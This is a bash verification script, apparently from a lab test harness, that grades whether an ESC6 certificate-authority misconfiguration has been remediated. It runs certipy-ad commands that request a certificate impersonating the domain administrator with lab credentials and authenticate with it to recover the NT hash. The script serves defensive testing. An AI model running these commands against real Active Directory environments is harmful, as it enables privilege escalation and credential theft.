#!/usr/bin/env bash
# meta4/ad-vm/scenario-10/verify-poc.sh
# PASS (exit 0) iff alice cannot coerce a SAN=administrator UPN cert via ESC6.

set -euo pipefail
cd "$(mktemp -d)"

REQ=$(timeout 60 /usr/bin/certipy-ad req \
    -u 'alice@corp.local' -p 'Password1!' \
    -ca 'corp-ca01-CA' \
    -dc-ip 10.20.30.5 \
    -template 'User' \
    -upn 'administrator@corp.local' 2>&1 || true)
echo "--- certipy req ---"
echo "$REQ"

# --- CA not serving RPC: HARNESS ERROR, never a verdict ---
#
# ept_s_not_registered means the endpoint mapper has no ICertRequestD
# (91AE6020-9E3C-11CF-8D7C-00AA00C091BE) to hand out: the CA's enrollment
# interface is not reachable from here, which says nothing about whether the
# EDITF_ATTRIBUTESUBJECTALTNAME2 SAN override is still accepted.
#
# This used to fall through to exit 1, which is wrong in BOTH directions.
# Observed on the 2026-07-26 gate run: gates 1 AND 2 both hit this, so the
# vulnerable baseline "failed for the right reason" and the remediated host
# "was still vulnerable" -- on identical output that only ever meant the CA
# was unreachable. Exit 2 keeps it out of the evidence pool entirely.
#
# Note this scenario's remediation RESTARTS CertSvc (clearing the flag needs
# it), so a genuine race is possible here -- which is precisely why it must be
# a harness error the runner can retry, not a graded result.
if echo "$REQ" | grep -qiE 'ept_s_not_registered|Failed to get DCE RPC connection|Failed to get dynamic TCP endpoint'; then
    echo "[verify-poc-10] HARNESS ERROR: CA RPC enrollment interface not registered" >&2
    echo "[verify-poc-10] the CA is not serving ICertRequestD to this host -- fix the lab, not the scenario" >&2
    exit 2
fi

if [ -f administrator.pfx ]; then
    AUTH=$(timeout 60 /usr/bin/certipy-ad auth \
        -pfx administrator.pfx \
        -dc-ip 10.20.30.5 2>&1 || true)
    echo "--- certipy auth ---"
    echo "$AUTH"
    if echo "$AUTH" | grep -qE 'NT hash|AS-REP received'; then
        echo "[verify-poc-10] ESC6 still open -- SAN override accepted, NT hash recovered" >&2
        exit 1
    fi
fi

if echo "$REQ" | grep -qiE 'access_denied|enrollment.*denied|invalid.*request|denied by policy'; then
    echo "[verify-poc-10] CA rejected SAN override -- BLOCKED"
    exit 0
fi
echo "[verify-poc-10] no admin PFX and no recognised denial - INCONCLUSIVE, grading FAIL" >&2
echo "[verify-poc-10] an inconclusive probe is not evidence that the SAN override was blocked" >&2
exit 1
